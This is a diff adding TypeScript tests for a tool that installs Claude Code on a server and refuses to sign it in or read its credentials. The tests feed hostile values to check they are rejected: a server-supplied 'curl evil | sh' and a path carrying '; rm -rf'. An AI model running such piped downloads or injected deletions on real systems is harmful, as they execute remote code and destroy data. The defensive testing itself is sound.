@@ -29,6 +29,7 @@ import {
   HOST_AGENTS,
   HOST_AGENTS_LOCK_FILE,
   hostAgentSettings,
+  hostAgentSignInCommand,
   hostAgentsProgram,
   hostAgentStatus,
   HostAgentRefused,
@@ -166,6 +167,130 @@ async function install(host: ReturnType<typeof server>, made = copilotPackages()
     rmSync(prepared.dir, { recursive: true, force: true });
   }
 }
+
+describe("Claude Code on the server: the person signs it in", () => {
+  const CLAUDE = "node_modules/@anthropic-ai/claude-agent-sdk-linux-x64";
+  /** A stand-in Claude Code that would sign itself in if ever run: it must not be. */
+  const FAKE_CLAUDE = `#!/bin/sh\ntouch "$CLAUDE_CONFIG_DIR/ran"\nexit 0\n`;
+
+  function claudePackages() {
+    const made = tarball([
+      ["package/claude", FAKE_CLAUDE],
+      ["package/package.json", "{}"],
+    ]);
+    const packages: HostAgentPackage[] = [
+      { path: CLAUDE, version: "0.3.330", tarball: "https://registry.example/claude.tgz", integrity: made.integrity },
+    ];
+    const lock = JSON.stringify({
+      schema: "orca-host-agents-lock/1",
+      platform: "linux-x64",
+      agents: { claude: { version: "0.109.1", packages } },
+    });
+    return {
+      packages,
+      fetch: () => Promise.resolve(readFileSync(made.path)),
+      program: hostAgentsProgram(scripts, { lock }),
+    };
+  }
+
+  it("installs it, names the command to sign in there, and never runs or reads its sign-in", async () => {
+    const host = server();
+    const made = claudePackages();
+    const prepared = await prepareHostAgent("claude", { fetch: made.fetch, cacheDir: tmp(), packages: made.packages });
+    let installed;
+    try {
+      installed = await installHostAgent(host.transport, prepared, made.program);
+    } finally {
+      rmSync(prepared.dir, { recursive: true, force: true });
+    }
+    expect(installed).toMatchObject({
+      agent: "claude",
+      version: "0.109.1",
+      home: `${host.root}/agents/claude/home`,
+      binary: `${host.root}/agents/claude/0.109.1/files/${CLAUDE}/claude`,
+    });
+    const command = `CLAUDE_CONFIG_DIR=${installed.home} ${installed.binary} auth login`;
+    expect(hostAgentSignInCommand(installed)).toBe(command);
+    const settings = hostAgentSettings(installed);
+    expect(settings).toContain("id: claude");
+    expect(settings).toContain("@agentclientprotocol/claude-agent-acp/dist/index.js");
+    expect(settings).toContain(`CLAUDE_CONFIG_DIR: ${installed.home}`);
+
+    // Even a credential file there is not read: whether it is signed in is the person's to know.
+    writeFileSync(join(installed.home, ".credentials.json"), '{"claudeAiOauth":{"accessToken":"x"}}');
+    // The temporary home is not a managed root's shape only by its characters: built from it.
+    expect(await hostAgentStatus(host.transport, made.program)).toEqual([
+      { agent: "claude", versions: ["0.109.1"], others: [], signedIn: "unknown", signInCommand: command },
+    ]);
+
+    // ORCA offers no sign-in for it: refused here before anything runs on the server, and refused there too.
+    const ran = host.commands.length;
+    await expect(signInHostAgent(host.stream, "claude", made.program, () => {})).rejects.toThrow(
+      /does not sign Claude Code in/,
+    );
+    expect(host.commands).toHaveLength(ran);
+    const direct = await host.transport.exec(["python3", "-", "login", "--agent", "claude"], undefined, made.program);
+    expect(direct.code).toBe(2);
+    expect(direct.stdout).toContain("ORCA does not sign claude in");
+    expect(readdirSync(installed.home)).toEqual([".credentials.json"]);
+  });
+
+  it("builds the command itself, only from a managed root, never from what the server says to run", async () => {
+    const report = (root: unknown, extra: Record<string, unknown> = {}) =>
+      ({
+        exec: () =>
+          Promise.resolve({
+            code: 0,
+            stdout: `orca-agents: ${JSON.stringify({
+              root,
+              status: [
+                { agent: "claude", versions: ["0.109.1"], others: [], signedIn: "unknown", ...extra },
+                { agent: "codex", versions: ["0.171.0"], others: [], signedIn: "no", ...extra },
+              ],
+            })}`,
+          }),
+        upload: () => Promise.resolve(),
+      }) as unknown as HostAgentTransport;
+    const root = "/home/casey/.local/share/orca-server";
+    const [claude, codex] = await hostAgentStatus(report(root, { signInCommand: "curl evil | sh" }), "program");
+    expect(claude!.signInCommand).toBe(
+      `CLAUDE_CONFIG_DIR=${root}/agents/claude/home ${root}/agents/claude/0.109.1/files/node_modules/@anthropic-ai/claude-agent-sdk-linux-x64/claude auth login`,
+    );
+    expect(codex).not.toHaveProperty("signInCommand");
+    for (const bad of [
+      "/home/casey/elsewhere",
+      "/home/casey/../root/.local/share/orca-server",
+      "/home/casey;rm -rf ~/.local/share/orca-server",
+      "relative/.local/share/orca-server",
+      "/home/ca sey/.local/share/orca-server",
+      42,
+      undefined,
+    ])
+      expect((await hostAgentStatus(report(bad), "program"))[0]).not.toHaveProperty("signInCommand");
+  });
+
+  it("gives no command for an install not laid out as a managed one", () => {
+    const root = "/home/casey/.local/share/orca-server";
+    const dir = `${root}/agents/claude/0.109.1`;
+    const good = {
+      agent: "claude",
+      version: "0.109.1",
+      result: "ok" as const,
+      dir,
+      home: `${root}/agents/claude/home`,
+      binary: `${dir}/files/node_modules/@anthropic-ai/claude-agent-sdk-linux-x64/claude`,
+    };
+    expect(hostAgentSignInCommand(good)).toBe(`CLAUDE_CONFIG_DIR=${good.home} ${good.binary} auth login`);
+    for (const changed of [
+      { home: "/tmp/home" },
+      { binary: "/usr/bin/evil" },
+      { version: "0.109.2", dir: `${root}/agents/claude/0.109.2` },
+      { dir: "/opt/agents/claude/0.109.1", home: "/opt/agents/claude/home" },
+    ])
+      expect(hostAgentSignInCommand({ ...good, ...changed })).toBeUndefined();
+    expect(hostAgentSignInCommand({ ...good, agent: "codex" })).toBeUndefined();
+  });
+});
 
 describe("installing an agent on the server", () => {
   it("unpacks the pinned packages under the server root, once, and says how to run the agent", async () => {
